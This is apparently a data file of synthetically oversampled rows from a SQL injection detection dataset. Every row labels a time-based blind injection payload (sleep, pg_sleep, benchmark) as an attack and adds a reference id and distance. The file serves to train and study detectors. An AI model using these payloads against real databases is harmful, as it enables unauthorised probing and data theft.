+SMOTE_000183,attack,time,"1   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   8280  =  8280",nearest_attack_euclidean,R000139,0.12507806518355594
+SMOTE_000184,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000119,0.6649168577559424
+SMOTE_000185,attack,time,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",nearest_attack_euclidean,R000105,1.0875202124207282
+SMOTE_000186,attack,time,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000222,0.48134350437791235
+SMOTE_000187,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000045,0.7151131859177543
+SMOTE_000188,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000057,0.07663565777806186
+SMOTE_000189,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,0.7189925827160383
+SMOTE_000190,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000027,0.4367357816297454
+SMOTE_000191,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000099,0.6292079272283411
+SMOTE_000192,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000186,0.08337482227554747
+SMOTE_000193,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000279,1.8742334894859676
+SMOTE_000194,attack,time,1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000179,0.5733943516616096
+SMOTE_000195,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000244,1.7993021653239858
+SMOTE_000196,attack,time,"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000311,0.6095424388914976
+SMOTE_000197,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000213,0.11255399375406967
+SMOTE_000198,attack,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000053,1.2142048248704196
+SMOTE_000199,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000249,0.5134942963536773
+SMOTE_000200,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000225,0.6712716922487825
